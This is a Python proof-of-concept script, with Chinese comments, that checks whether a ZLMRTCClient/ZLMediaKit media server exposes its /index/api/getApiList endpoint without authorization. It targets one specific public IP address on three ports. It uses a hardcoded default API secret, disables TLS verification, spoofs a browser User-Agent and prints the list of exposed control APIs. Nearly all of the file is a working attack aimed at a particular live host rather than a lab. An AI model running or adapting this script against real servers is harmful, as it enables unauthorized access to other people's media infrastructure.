#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZLMRTCClient /index/api/getApiList 未授权访问漏洞验证脚本
"""

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    {"url": "https://58.220.222.66:8091", "desc": "HTTPS端口"},
    {"url": "http://58.220.222.66:8090", "desc": "HTTP端口8090"},
    {"url": "http://58.220.222.66:18090", "desc": "HTTP端口18090"},
]

SECRET = "035c73f7-bb6b-4889-a715-d9eb2d1925cc"

print("=" * 70)
print("  ZLMRTCClient 未授权访问漏洞验证")
print("  目标: 58.220.222.66")
print("=" * 70)
print()

for target in TARGETS:
    url = f"{target['url']}/index/api/getApiList?secret={SECRET}"
    print(f"[测试] {target['desc']}: {url}")
    print("-" * 70)
    
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        
        print(f"  状态码: {response.status_code}")
        print(f"  Server: {response.headers.get('Server', 'N/A')}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                if "api" in data or "data" in data:
                    print(f"  漏洞状态: ✅ 存在")
                    print(f"  响应类型: API列表")
                    
                    # 统计API数量
                    apis = data.get("api", data.get("data", []))
                    if isinstance(apis, list):
                        print(f"  API数量: {len(apis)}个")
                        
                        # 显示部分API
                        print(f"  部分API示例:")
                        for i, api in enumerate(apis[:10]):
                            if isinstance(api, dict):
                                api_path = api.get("path", api.get("url", "N/A"))
                                api_desc = api.get("desc", api.get("description", ""))
                                print(f"    {i+1}. {api_path} - {api_desc}")
                            else:
                                print(f"    {i+1}. {api}")
                        
                        if len(apis) > 10:
                            print(f"    ... 还有{len(apis)-10}个API")
                else:
                    print(f"  漏洞状态: ✅ 存在 (响应了其他内容)")
                    print(f"  响应内容: {str(data)[:200]}...")
            except:
                print(f"  漏洞状态: ✅ 存在 (响应非JSON)")
                print(f"  响应内容: {response.text[:200]}...")
        else:
            print(f"  漏洞状态: ❌ 未命中 (状态码: {response.status_code})")
            
    except requests.exceptions.Timeout:
        print(f"  漏洞状态: ❌ 连接超时")
    except requests.exceptions.ConnectionError:
        print(f"  漏洞状态: ❌ 连接失败")
    except Exception as e:
        print(f"  漏洞状态: ❌ 测试异常: {e}")
    
    print()

print("=" * 70)
print("  漏洞验证完成")
print("=" * 70)
